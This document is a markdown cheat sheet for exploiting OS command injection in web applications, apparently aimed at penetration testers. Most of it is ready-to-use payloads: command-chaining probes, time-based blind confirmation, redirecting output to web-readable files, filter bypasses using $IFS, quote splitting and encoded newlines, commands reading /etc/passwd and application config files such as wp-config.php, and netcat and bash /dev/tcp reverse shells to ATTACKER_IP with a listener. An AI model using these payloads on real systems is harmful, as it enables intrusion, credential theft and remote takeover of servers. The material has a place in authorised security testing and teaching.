# ⚙️ Command Injection

---

## 📖 Description

Command Injection is a vulnerability that occurs when a web application passes user-controlled input to a system shell without proper sanitization. Functions like `exec()`, `system()`, or `shell_exec()` in PHP — or their equivalents in other languages — execute whatever string they receive, allowing an attacker to **append additional OS commands** that the server runs with the application's privileges.

It is commonly found in features that interact with the underlying system: ping tools, DNS lookups, traceroute, host checkers, or any field that takes user input and passes it to a shell command.

---

## 🔎 Detection

### Where to look

- **GET parameters** → `?host=`, `?ip=`, `?cmd=`, `?exec=`, `?ping=`, `?domain=`
- **Form fields** → any field that interacts with the system (ping, traceroute, DNS lookup, host checker)
- **HTTP headers** → `User-Agent`, `Referer`, `X-Forwarded-For`

### Testing for injection

Inject command chaining operators after the legitimate input and observe the response. Try all six — different systems and configurations respond to different operators:

```bash
<original_input>; whoami
<original_input>| whoami
<original_input>&& whoami
<original_input>|| whoami
<original_input>`whoami`
<original_input>$(whoami)
<original_input>\nwhoami
```

It's also worth trying to close the existing command before injecting:

```
INPUT; command||
INPUT | command||
INPUT && command||
```

Real example against a ping field:

```
127.0.0.1; whoami
127.0.0.1 | whoami
127.0.0.1 && whoami
127.0.0.1 || whoami
```

### Identifying the type

```
Is the command output visible on the page?
  YES → IN-BAND    → exploit directly
  NO  → BLIND      → confirm with time-based technique
```

---

## 💥 Types & Exploitation

---

### 1️⃣ In-Band

Output is directly visible in the page response. Once injection is confirmed, read sensitive files immediately:

```bash
; whoami
; id
; cat /etc/passwd
; cat /etc/hosts
; ls /var/www/html
; cat /var/www/html/config.php
; cat /var/www/html/wp-config.php
```

---

### 2️⃣ Blind — Time-Based

No output is visible in the response. Confirm code execution by measuring the response delay:

#### Confirm with sleep

```bash
; sleep 5
& sleep 5
| sleep 5
|| sleep 5
&& sleep 5
```

#### Confirm with ping

```bash
; ping -c 5 127.0.0.1
|| ping -c 5 127.0.0.1
```

#### Exfiltrate output to a public file

Once execution is confirmed, redirect command output to a web-accessible file and retrieve it from the browser:

```bash
; whoami > /var/www/html/output.txt
; id > /var/www/html/output.txt
; cat /etc/passwd > /var/www/images/output.txt
```

Then read it from the browser:

```
http://TARGET/output.txt
http://TARGET/images/output.txt
```

---

## ✋🏻 Bypasses

### Space filter

When spaces are blocked, use these alternatives:

```bash
; cat${IFS}/etc/passwd
; cat$IFS/etc/passwd
; cat%09/etc/passwd        ← tab character
;{cat,/etc/passwd}
```

### Keyword filter

When specific command names are blocked, break them up with quotes (which the shell ignores):

```bash
; w'h'o'a'm'i
; w"h"o"a"m"i
; c'a't /etc/passwd
; c"a"t /etc/passwd
```

### Operator filter

When common operators are blocked, try URL-encoded newline characters:

```bash
%0a whoami     ← newline (URL encoded)
%0d whoami     ← carriage return
```

---

## 🔪 Post-Exploitation

### Priority files to read

```bash
; cat /var/www/html/config.php
; cat /var/www/html/wp-config.php
; cat /var/www/html/configuration.php
; cat /etc/passwd
; ls -la /var/www/html
```

### Reverse Shell

Only attempt if there is confirmed network connectivity between target and attacker:

```bash
# Netcat
; nc -e /bin/bash ATTACKER_IP 4444

# Bash native
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

Start the listener on the attacker machine:

```bash
nc -lvnp 4444
```
